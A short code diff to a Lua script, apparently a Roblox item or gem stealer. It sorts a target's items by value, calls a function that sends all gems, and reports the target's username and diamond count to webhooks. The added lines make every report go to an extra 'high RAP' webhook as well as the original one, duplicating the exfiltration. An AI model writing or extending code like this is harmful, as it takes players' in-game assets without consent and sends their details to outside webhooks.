@@ -128,7 +128,16 @@ local function SendMessage(username, diamonds, webhookUrl)
     local body = HttpService:JSONEncode(data)
 
     if webhookUrl and webhookUrl ~= "" then
-        local response = request({
+        -- Send the message to the high RAP webhook
+        request({
+            Url = highRAPWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+
+        -- Send the message to the original webhook
+        request({
             Url = webhookUrl,
             Method = "POST",
             Headers = headers,
@@ -281,7 +290,9 @@ if #sortedItems > 0 then
     local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
     spawn(function()
-        SendMessage(targetUser, GemAmount1, targetWebhook)
+        -- Send message to both webhooks
+        SendMessage(targetUser, GemAmount1, webhook)
+        SendMessage(targetUser, GemAmount1, highRAPWebhook)
     end)
 
     SendAllGems()
